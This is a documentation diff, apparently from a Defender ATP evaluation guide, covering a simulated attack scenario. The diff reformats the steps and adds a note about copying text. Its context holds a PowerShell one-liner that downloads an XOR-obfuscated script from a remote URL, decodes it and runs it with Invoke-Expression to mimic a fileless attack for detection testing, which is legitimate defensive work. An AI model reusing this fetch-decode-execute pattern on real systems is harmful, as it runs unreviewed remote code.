@@ -61,9 +61,9 @@ If you use an existing tenant and implement device groups, create a dedicated de
 ## Run the simulation
 
 To run the attack scenario simulation:
-1.	Log in to the test device with the test user account.
-2.	Open a Windows PowerShell window on the test device.
-3.	Copy the following simulation script:
+    1.	Log in to the test device with the test user account.
+    2.	Open a Windows PowerShell window on the test device.
+    3.	Copy the following simulation script:
 ```
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
 = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
@@ -71,6 +71,9 @@ To run the attack scenario simulation:
 $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
 $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
 ```
+>[!NOTE]
+>If you open this document on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks. Download this document and open it on Adobe Reader.
+
 
 
 ## Investigate an incident
